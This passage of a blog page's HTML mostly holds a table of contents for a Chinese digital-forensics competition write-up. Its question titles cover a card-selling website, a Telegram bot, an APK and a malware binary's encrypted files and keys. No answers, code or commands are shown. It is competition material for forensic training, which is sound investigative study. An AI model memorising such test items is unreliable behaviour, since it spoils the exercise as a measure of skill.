href="#10%E3%80%81%E9%9B%86%E7%BE%A4%E4%B8%AD%E9%85%8D%E7%BD%AE%E7%9A%84%E5%8F%91%E5%8D%A1%E7%BD%91%E7%AB%99%E4%BB%A3%E7%A0%81%E8%BF%90%E8%A1%8C%E6%89%80%E5%9C%A8%E7%9A%84%E7%89%A9%E7%90%86%E7%9B%AE%E5%BD%95%E6%98%AF%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A-root-root%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">10、集群中配置的发卡网站代码运行所在的物理目录是？（答案格式：&#x2F;root&#x2F;root）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#11%E3%80%81Telegram%E7%BE%A4%E7%AE%A1%E6%9C%BA%E5%99%A8%E4%BA%BA%E9%85%8D%E7%BD%AE%E7%9A%84API%E4%BB%A3%E7%90%86%E5%9F%9F%E5%90%8D%E6%98%AF%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9Awww-xxx-com%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">11、Telegram群管机器人配置的API代理域名是？（答案格式：www.xxx.com）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#12%E3%80%81%E5%AB%8C%E7%96%91%E4%BA%BA%E5%9C%A8Telegram%E4%B8%8A%E5%88%9B%E5%BB%BA%E7%9A%84%E7%BE%A4%E5%90%8D%E7%A7%B0%E6%98%AF%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A%E6%AF%94%E6%AD%A6%E7%BE%A4%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">12、嫌疑人在Telegram上创建的群名称是？（答案格式：比武群）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#13%E3%80%81%E7%BB%9F%E8%AE%A1%E5%AB%8C%E7%96%91%E4%BA%BA%E5%9C%A8Telegram%E4%B8%8A%E5%88%9B%E5%BB%BA%E7%9A%84%E7%BE%A4%E4%B8%AD2025%E5%B9%B46%E6%9C%88%E4%B9%8B%E5%90%8E%E6%88%90%E5%8A%9F%E5%85%A5%E7%BE%A4%E7%9A%84%E4%BA%BA%E6%95%B0%E4%B8%BA%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A1%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">13、统计嫌疑人在Telegram上创建的群中2025年6月之后成功入群的人数为？（答案格式：1）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link"><span class="toc-list-text"></span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#14%E3%80%81%E6%8D%AE%E5%AB%8C%E7%96%91%E4%BA%BA%E4%BA%A4%E4%BB%A3%E6%9B%BE%E5%9C%A8%E5%8F%91%E5%8D%A1%E7%BD%91%E4%B8%8A%E5%88%A0%E9%99%A4%E8%BF%87%E4%B8%80%E6%9D%A1%E8%AE%A2%E5%8D%95%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%AF%B7%E6%89%BE%E5%87%BA%E8%AF%A5%E5%88%A0%E9%99%A4%E8%AE%A2%E5%8D%95%E7%9A%84%E8%AE%A2%E5%8D%95%E5%8F%B7%E6%98%AF%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A%E8%AF%B7%E6%8C%89%E5%AE%9E%E9%99%85%E5%80%BC%E5%A1%AB%E5%86%99%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">14、据嫌疑人交代曾在发卡网上删除过一条订单数据，请找出该删除订单的订单号是？（答案格式：请按实际值填写）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#-1"><span class="toc-list-text"></span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#15%E3%80%81%E5%8F%91%E5%8D%A1%E7%BD%91%E7%AB%99%E4%B8%8A2025%E5%B9%B46%E6%9C%88%E4%B9%8B%E5%90%8E%E8%AE%A2%E5%8D%95%E4%BA%A4%E6%98%93%E6%88%90%E5%8A%9F%E7%9A%84%E6%80%BB%E9%87%91%E9%A2%9D%E6%98%AF%EF%BC%9F%E5%BF%BD%E7%95%A5%E8%A2%AB%E5%88%A0%E9%99%A4%E7%9A%84%E6%95%B0%E6%8D%AE%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A1%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">15、发卡网站上2025年6月之后订单交易成功的总金额是？忽略被删除的数据（答案格式：1）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#-2"><span class="toc-list-text"></span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#16%E3%80%81%E5%8F%91%E5%8D%A1%E7%BD%91%E7%AB%99%E7%9A%84%E5%90%8E%E5%8F%B0%E8%AE%BF%E9%97%AE%E8%B7%AF%E5%BE%84%E6%98%AF%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A-root%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">16、发卡网站的后台访问路径是？（答案格式：&#x2F;root）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#17%E3%80%81%E8%AE%A1%E7%AE%97%E5%87%BA%E7%94%A8%E6%88%B7%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E4%B8%ADSalt%E7%9A%84%E5%80%BC%EF%BC%8C%E5%B9%B6%E8%BF%9B%E8%A1%8CBase64%E7%BC%96%E7%A0%81%EF%BC%8C%E7%BB%93%E6%9E%9C%E6%98%AF%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A%E8%AF%B7%E6%8C%89%E5%AE%9E%E9%99%85%E5%80%BC%E5%A1%AB%E5%86%99%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">17、计算出用户密码算法中Salt的值，并进行Base64编码，结果是？（答案格式：请按实际值填写）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#18%E3%80%81%E5%8F%91%E5%8D%A1%E7%BD%91%E7%AB%99%E9%85%8D%E7%BD%AE%E7%9A%84%E9%82%AE%E4%BB%B6%E5%8F%91%E9%80%81%E4%BA%BA%E5%9C%B0%E5%9D%80%E6%98%AF%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9Aabc-abc-com%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">18、发卡网站配置的邮件发送人地址是？（答案格式：abc@abc.com）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#-3"><span class="toc-list-text"></span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#19%E3%80%81%E5%BD%93%E5%89%8D%E5%8F%91%E5%8D%A1%E7%BD%91%E7%AB%99%E9%A6%96%E9%A1%B5%E4%BB%AA%E8%A1%A8%E7%9B%98%E4%B8%AD%E6%98%BE%E7%A4%BA%E7%9A%84%E5%8F%91%E5%8D%A1%E7%BD%91%E7%AB%99%E7%89%88%E6%9C%AC%E4%B8%BA%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A1-1-1%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">19、当前发卡网站首页仪表盘中显示的发卡网站版本为？（答案格式：1.1.1）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#20%E3%80%81%E5%BD%93%E5%89%8D%E5%8F%91%E5%8D%A1%E7%BD%91%E7%AB%99%E4%B8%AD%E7%BB%91%E5%AE%9A%E7%9A%84%E8%AE%A2%E5%8D%95%E6%8E%A8%E9%80%81Telegram%E7%94%A8%E6%88%B7id%E4%B8%BA%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A%E8%AF%B7%E6%8C%89%E5%AE%9E%E9%99%85%E5%80%BC%E5%A1%AB%E5%86%99%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">20、当前发卡网站中绑定的订单推送Telegram用户id为（答案格式：请按实际值填写）（ ）</span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#%E6%B5%81%E9%87%8F%E5%8C%85%E5%88%86%E6%9E%90"><span class="toc-list-text">流量包分析</span></a></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#APK%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-list-text">APK程序分析</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#31%E3%80%81apk-%E7%9A%84%E7%89%88%E6%9C%AC%E5%90%8D%E7%A7%B0%E4%B8%BA%EF%BC%9F-%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A1-1-1%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">31、apk 的版本名称为？ （答案格式：1.1.1）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#32%E3%80%81%E5%9C%A8%E8%AF%A5APP%E4%B8%AD%EF%BC%8C%E8%B0%83%E7%94%A8%E4%BA%86%E5%93%AA%E4%B8%AASystem%E7%9A%84%E6%96%B9%E6%B3%95%E7%94%A8%E4%BA%8E%E8%8E%B7%E5%8F%96%E6%9C%AC%E5%9C%B0%E7%B3%BB%E7%BB%9F%E7%9A%84%E6%97%B6%E9%97%B4%E6%88%B3%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9AMainActivity%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">32、在该APP中，调用了哪个System的方法用于获取本地系统的时间戳？（答案格式：MainActivity）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#33%E3%80%81apk%E8%BF%90%E8%A1%8C%E5%90%8EgetVer-%E7%9A%84%E8%BF%94%E5%9B%9E%E5%80%BC%E6%98%AF%E5%A4%9A%E5%B0%91%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A1-0-0%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">33、apk运行后getVer()的返回值是多少？（答案格式：1.0.0）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#34%E3%80%81apk%E8%BF%90%E8%A1%8C%E5%90%8E%E9%9C%80%E8%A6%81%E9%80%9A%E8%BF%87%E4%B8%80%E4%B8%AAhttp-get%E8%AF%B7%E6%B1%82%E6%89%8D%E8%83%BD%E6%89%93%E5%BC%80%E7%AC%AC%E4%BA%8C%E4%B8%AA%E7%95%8C%E9%9D%A2%EF%BC%8C%E7%BB%99%E5%87%BA%E8%AF%A5%E8%AF%B7%E6%B1%82URL%EF%BC%9F-%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9Ahttp-www-xxx-com-test-a-1%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">34、apk运行后需要通过一个http get请求才能打开第二个界面，给出该请求URL？ （答案格式：http:&#x2F;&#x2F;www.xxx.com&#x2F;test?a&#x3D;1）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#35%E3%80%81apk%E7%AC%AC%E4%BA%8C%E7%95%8C%E9%9D%A2%E7%9A%848%E4%BD%8D%E6%8E%88%E6%9D%83%E7%A0%81%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F-%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A11111111%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">35、apk第二界面的8位授权码是什么？ （答案格式：11111111）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#-4"><span class="toc-list-text"></span></a></li></ol></li><li class="toc-list-item toc-list-level-1"><a class="toc-list-link" href="#%E4%BA%8C%E8%BF%9B%E5%88%B6%E7%A8%8B%E5%BA%8F%E5%88%86%E6%9E%90"><span class="toc-list-text">二进制程序分析</span></a><ol class="toc-list-child"><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#36%E3%80%81%E5%AE%89%E8%A3%85%E8%AF%A5%E7%A8%8B%E5%BA%8F%E5%90%8E%EF%BC%8C%E8%AF%A5%E6%81%B6%E6%84%8F%E7%A8%8B%E5%BA%8F%E7%9A%84%E5%8F%AF%E6%89%A7%E8%A1%8C%E6%96%87%E4%BB%B6%E6%89%80%E5%9C%A8%E7%9A%84%E7%9B%B4%E6%8E%A5%E7%88%B6%E7%9B%AE%E5%BD%95%E5%90%8D%E7%A7%B0%E6%98%AF%E4%BB%80%E4%B9%88%E4%B8%BA%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9Aroot%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">36、安装该程序后，该恶意程序的可执行文件所在的直接父目录名称是什么为？（答案格式：root）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#37%E3%80%81%E8%A7%A3%E5%AF%86%E6%96%87%E4%BB%B6%E5%90%8D%E4%B8%BARnRGaWxlcy5lZGIiL%E7%9A%84%E6%96%87%E4%BB%B6%E6%97%B6%E6%89%80%E4%BD%BF%E7%94%A8%E7%9A%84key%E6%98%AF%E4%BB%80%E4%B9%88%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A%E8%AF%B7%E6%8C%89%E5%AE%9E%E9%99%85%E5%80%BC%E5%A1%AB%E5%86%99%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">37、解密文件名为RnRGaWxlcy5lZGIiL的文件时所使用的key是什么？（答案格式：请按实际值填写）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#38%E3%80%81%E8%A7%A3%E5%AF%86%E6%96%87%E4%BB%B6RnRGaWxlcy5lZGIiL%E6%88%90%E5%8A%9F%E5%90%8E%EF%BC%8C%E8%AF%B7%E5%88%86%E6%9E%90%E5%B9%B6%E7%BB%99%E5%87%BA%E8%A7%A3%E5%AF%86%E5%90%8E%E7%9A%84%E6%96%87%E4%BB%B6%E7%9A%84%E5%85%A5%E5%8F%A3%E7%82%B9%E5%9C%B0%E5%9D%80%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A0x180000000%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">38、解密文件RnRGaWxlcy5lZGIiL成功后，请分析并给出解密后的文件的入口点地址？（答案格式：0x180000000）（ ）</span></a></li><li class="toc-list-item toc-list-level-2"><a class="toc-list-link" href="#%EF%BC%9F39%E3%80%81%E5%8A%A0%E5%AF%86%E6%96%87%E4%BB%B6%E5%90%8D%E4%B8%BA6c051a72b91a1%E7%9A%84%E6%96%87%E4%BB%B6%E6%97%B6%E6%89%80%E4%BD%BF%E7%94%A8%E7%9A%84%E5%AF%86%E9%92%A5%E6%98%AF%E5%A4%9A%E5%B0%91%EF%BC%9F%EF%BC%88%E7%AD%94%E6%A1%88%E6%A0%BC%E5%BC%8F%EF%BC%9A%E8%AF%B7%E6%8C%89%E5%AE%9E%E9%99%85%E5%80%BC%E5%A1%AB%E5%86%99%EF%BC%89%EF%BC%88-%EF%BC%89"><span class="toc-list-text">？39、加密文件名为6c051a72b91a1的文件时所使用的密钥是多少？（答案格式：请按实际值填写）（ ）</span></a></li></ol></li></ol></div>
+      
+    </div>
+
+    
+      <div class="card-panel sticky-panel">
+        <h3>More from 电子取证</h3>
+        <div class="mini-list">
+          
+            <a href="/notes/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2024%E7%BE%8E%E4%BA%9A%E6%9D%AF/%E4%B8%AA%E4%BA%BA%E8%B5%9B/">
+              <strong>个人赛</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2024%E6%95%B0%E8%AF%81%E6%9D%AF/%E3%80%90%E8%BD%AC%E8%BD%BD%E3%80%9124%E6%95%B0%E8%AF%81%E5%86%B3-%E5%9B%A2/">
+              <strong>【转载】24数证决-团</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2024%E6%95%B0%E8%AF%81%E6%9D%AF/2024%E6%95%B0%E8%AF%81%E6%9D%AF%E5%88%9D%E8%B5%9B/">
+              <strong>2024数证杯初赛</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+            <a href="/notes/%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/2024%E6%95%B0%E8%AF%81%E6%9D%AF/2024%E6%95%B0%E8%AF%81%E6%9D%AF%E5%86%B3%E8%B5%9B-%E4%B8%AA%E4%BA%BA%E8%B5%9B/">
+              <strong>2024数证杯决赛-个人赛</strong>
+              <span>2026-04-19</span>
+            </a>
+          
+        </div>
+      </div>
+    
+  </aside>
+</article>
+
+      </main>
+      
+<footer class="site-footer">
+  <div class="footer-inner">
+    <div>
+      <strong>JerryXie&#39;s Blog</strong>
+      <p>CTF, digital forensics, offensive security, and study notes.</p>
+    </div>
+    <div class="footer-meta">
+      <span>Hexo</span>
+      <span class="dot"></span>
+      <a href="https://github.com/JerryXie599/jerryxie599.github.io" target="_blank" rel="noopener">GitHub</a>
+      <span class="dot"></span>
+      <a href="https://jerryxie.top/" target="_blank" rel="noopener">Live</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+  </body>
+</html>
